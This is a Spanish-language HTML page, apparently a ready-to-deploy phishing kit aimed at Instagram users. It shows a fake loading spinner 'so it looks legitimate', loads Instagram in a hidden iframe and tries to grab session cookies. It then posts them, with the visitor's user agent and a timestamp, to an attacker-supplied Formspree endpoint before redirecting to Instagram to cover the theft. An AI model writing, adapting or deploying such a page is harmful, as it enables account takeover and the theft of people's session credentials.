<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body { margin: 0; padding: 0; background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        iframe { display: none; }
        .loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; justify-content: center; align-items: center; z-index: 9999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <!-- Pantalla de carga para que parezca legítimo -->
    <div class="loader" id="loader">
        <div class="spinner"></div>
    </div>

    <!-- Iframe oculto que carga Instagram -->
    <iframe id="igFrame" src="https://www.instagram.com/" style="width:100%; height:100vh; border:none;"></iframe>
    
    <script>
        // Configuración: REEMPLAZA ESTO CON TU ID DE FORMSPREE
        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/TU_ID_DE_FORMSPREE';

        // Escuchar mensajes del iframe
        window.addEventListener('message', function(event) {
            if (event.data.type === 'cookies') {
                // Enviar cookies a Formspree
                fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        Cookies: event.data.cookies,
                        User_Agent: navigator.userAgent,
                        Timestamp: new Date().toISOString()
                    })
                }).then(() => {
                    // Ocultar loader y redirigir a Instagram
                    document.getElementById('loader').style.display = 'none';
                    window.location.href = "https://www.instagram.com";
                }).catch(err => {
                    console.error('Error enviando cookies:', err);
                    // En caso de error, igual redirigimos para no suspender
                    document.getElementById('loader').style.display = 'none';
                    window.location.href = "https://www.instagram.com";
                });
            }
        });

        // Intentar leer cookies del iframe cuando cargue
        document.getElementById('igFrame').onload = function() {
            try {
                // Acceder al contenido del iframe
                var iframeDoc = document.getElementById('igFrame').contentDocument || document.getElementById('igFrame').contentWindow.document;
                var cookies = iframeDoc.cookie;
                
                // Enviar cookies al padre (esta ventana)
                window.postMessage({ type: 'cookies', cookies: cookies }, '*');
            } catch(e) {
                // Si falla CORS, intentar leer desde la ventana principal
                var mainCookies = document.cookie;
                window.postMessage({ type: 'cookies', cookies: mainCookies }, '*');
            }
        };
    </script>
</body>
</html>
